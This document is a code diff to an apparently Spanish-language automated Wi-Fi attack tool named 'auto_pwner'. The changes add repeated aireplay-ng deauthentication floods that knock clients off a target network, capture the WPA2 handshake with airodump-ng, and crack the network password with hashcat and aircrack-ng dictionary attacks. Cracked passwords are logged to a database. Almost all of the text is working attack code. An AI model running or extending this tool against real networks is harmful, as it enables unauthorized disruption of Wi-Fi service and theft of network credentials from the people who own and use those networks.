@@ -526,14 +526,20 @@ def verify_handshake(cap_file):
         cap_file = cap_file + "-01.cap"
     if not os.path.exists(cap_file):
         return False, cap_file
-    r = run(f"aircrack-ng {cap_file} 2>&1", capture=True)
-    if r and "handshake" in r.lower():
+    # Verificación primaria: aircrack-ng reporta "handshake" explícitamente
+    r = run(f"aircrack-ng {cap_file} 2>&1", capture=True) or ""
+    if "handshake" in r.lower() and "no eapol" not in r.lower():
         return True, cap_file
-    # Verificación alternativa con hcxpcapngtool si aircrack-ng no detecta handshake
-    if os.path.exists(cap_file) and check_tool("hcxpcapngtool"):
-        _hc_test = run(f"hcxpcapngtool -o /tmp/_hs_test.hc22000 {cap_file} 2>&1", capture=True) or ""
+    # Verificación con hcxpcapngtool: limpiar residuo antes de testear
+    if check_tool("hcxpcapngtool"):
+        run("rm -f /tmp/_hs_test.hc22000 2>/dev/null")
+        out = run(f"hcxpcapngtool -o /tmp/_hs_test.hc22000 {cap_file} 2>&1", capture=True) or ""
+        # Rechazar si hcxpcapngtool reporta "no hashes written" explícitamente
+        if "no hashes written" in out.lower():
+            run("rm -f /tmp/_hs_test.hc22000 2>/dev/null")
+            return False, cap_file
         if os.path.exists("/tmp/_hs_test.hc22000") and os.path.getsize("/tmp/_hs_test.hc22000") > 0:
-            run("rm -f /tmp/_hs_test.hc22000")
+            run("rm -f /tmp/_hs_test.hc22000 2>/dev/null")
             return True, cap_file
     return False, cap_file
 
@@ -4748,9 +4754,9 @@ def auto_pwner():
             _hcx_proc.terminate()
             _hcx_proc.wait()
             if os.path.exists(pmkid_file) and check_tool("hcxpcapngtool"):
-                run(f"hcxpcapngtool -o {hc_file} {pmkid_file} 2>/dev/null")
+                run(f"hcxpcapngtool -o {hc_file} {pmkid_file} 2>/dev/null", capture=True)
             if os.path.exists(hc_file) and os.path.getsize(hc_file) > 0 and check_tool("hashcat"):
-                info("PMKID capturado. Crackeando con hashcat...")
+                info("  → PMKID capturado. Crackeando con hashcat...")
                 best64 = next((p for p in [
                     "/usr/share/hashcat/rules/best64.rule",
                     "/usr/share/doc/hashcat/rules/best64.rule",
@@ -4784,12 +4790,20 @@ def auto_pwner():
             info("Vector: Handshake WPA2 → capturando...")
             os.makedirs("handshakes", exist_ok=True)
             ruta = f"handshakes/auto_{essid_s}"
+            # Asegurar canal correcto antes de capturar
+            run(f"iwconfig {interfaz} channel {channel} 2>/dev/null")
             cap_p = subprocess.Popen(
-                f"xterm -title 'Auto-Capture {essid}' -e "
-                f"'airodump-ng -c {channel} --bssid {bssid} -w {ruta} {interfaz}'",
+                f"airodump-ng -c {channel} --bssid {bssid} -w {ruta} {interfaz}",
                 shell=True,
-                    stdin=subprocess.DEVNULL)
-            time.sleep(6)
+                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                stdin=subprocess.DEVNULL)
+            info("  → Capturando tráfico (10s antes de deauth)...")
+            time.sleep(10)
+            info("  → Enviando deauth para forzar reconexión...")
+            run(f"aireplay-ng -0 10 -a {bssid} {interfaz} 2>/dev/null")
+            time.sleep(3)
+            run(f"aireplay-ng -0 10 -a {bssid} {interfaz} 2>/dev/null")
+            time.sleep(3)
             run(f"aireplay-ng -0 20 -a {bssid} {interfaz} 2>/dev/null")
             time.sleep(5)
             cap_p.terminate()
@@ -4797,38 +4811,59 @@ def auto_pwner():
 
             ok_hs, cap_file = verify_handshake(ruta)
             if ok_hs:
-                ok(f"Handshake capturado: {cap_file}")
+                ok(f"Handshake EAPOL válido capturado: {cap_file}")
                 hc_f = ruta + ".hc22000"
                 if check_tool("hcxpcapngtool"):
-                    run(f"hcxpcapngtool -o {hc_f} {cap_file} 2>/dev/null")
+                    run(f"hcxpcapngtool -o {hc_f} {cap_file} 2>/dev/null", capture=True)
                 if check_tool("hashcat") and os.path.exists(hc_f) and os.path.getsize(hc_f) > 0:
                     best64 = next((p for p in [
                         "/usr/share/hashcat/rules/best64.rule",
                         "/usr/share/doc/hashcat/rules/best64.rule",
                     ] if os.path.exists(p)), "")
                     rf = f"-r {best64}" if best64 else ""
-                    run(f"hashcat -m 22000 -O {hc_f} {wordlist} {rf} --force "
-                        f"--status --status-timer=10 2>/dev/null")
+                    wl_name = os.path.basename(wordlist)
+                    info(f"  → Crackeando con hashcat: {wl_name} (max 300s, verás progreso abajo)")
+                    run(f"timeout 300 hashcat -m 22000 -O {hc_f} {wordlist} {rf} --force "
+                        f"--status --status-timer=5 2>/dev/null")
                     potfile = run(f"hashcat --show --quiet -m 22000 {hc_f} 2>/dev/null", capture=True) or ""
                     pm = re.search(r':(.+)$', potfile, re.MULTILINE)
                     if pm:
                         clave = pm.group(1).strip()
-                        ok(f"CONTRASEÑA: {GREEN}{clave}{END}")
+                        ok(f"CONTRASEÑA ENCONTRADA: {GREEN}{clave}{END}")
                         resultado = f"crackeada:{clave}"
                         aid = db_log_attack("Auto-Pwner HS", essid, bssid, channel, resultado, cap_file)
                         db_log_password(aid, essid, bssid, clave, "hashcat WPA2")
                         db_log_handshake(aid, cap_file, hc_f)
                     else:
-                        info("Crackeando con aircrack-ng...")
-                        run(f"aircrack-ng {cap_file} -w {wordlist}")
-                        resultado = "handshake_capturado"
-                        aid = db_log_attack("Auto-Pwner HS", essid, bssid, channel, resultado, cap_file)
+                        info("  → hashcat sin resultado. Probando aircrack-ng...")
+                        ac_out = run(f"aircrack-ng {cap_file} -w {wordlist} 2>/dev/null", capture=True) or ""
+                        km = _parse_aircrack_key(ac_out)
+                        if km:
+                            ok(f"CONTRASEÑA ENCONTRADA: {GREEN}{km}{END}")
+                            resultado = f"crackeada:{km}"
+                            aid = db_log_attack("Auto-Pwner HS", essid, bssid, channel, resultado, cap_file)
+                            db_log_password(aid, essid, bssid, km, "aircrack-ng WPA2")
+                        else:
+                            warn("  → Contraseña no encontrada en el diccionario.")
+                            resultado = "handshake_capturado_no_crackeado"
+                            aid = db_log_attack("Auto-Pwner HS", essid, bssid, channel, resultado, cap_file)
                         db_log_handshake(aid, cap_file)
                 else:
-                    run(f"aircrack-ng {cap_file} -w {wordlist}")
-                    resultado = "handshake_capturado"
-                    aid = db_log_attack("Auto-Pwner HS", essid, bssid, channel, resultado, cap_file)
+                    info("  → Crackeando con aircrack-ng (no se pudo convertir a hc22000)...")
+                    ac_out = run(f"aircrack-ng {cap_file} -w {wordlist} 2>/dev/null", capture=True) or ""
+                    km = _parse_aircrack_key(ac_out)
+                    if km:
+                        ok(f"CONTRASEÑA ENCONTRADA: {GREEN}{km}{END}")
+                        resultado = f"crackeada:{km}"
+                        aid = db_log_attack("Auto-Pwner HS", essid, bssid, channel, resultado, cap_file)
+                        db_log_password(aid, essid, bssid, km, "aircrack-ng WPA2")
+                    else:
+                        warn("  → Contraseña no encontrada en el diccionario.")
+                        resultado = "handshake_capturado_no_crackeado"
+                        aid = db_log_attack("Auto-Pwner HS", essid, bssid, channel, resultado, cap_file)
+                    db_log_handshake(aid, cap_file)
             else:
+                warn("  → No se capturó handshake EAPOL válido. ¿Hay clientes conectados?")
                 resultado = "handshake_fallido"
                 aid = db_log_attack("Auto-Pwner HS", essid, bssid, channel, resultado)
                 warn(f"No se capturó handshake de {essid}.")
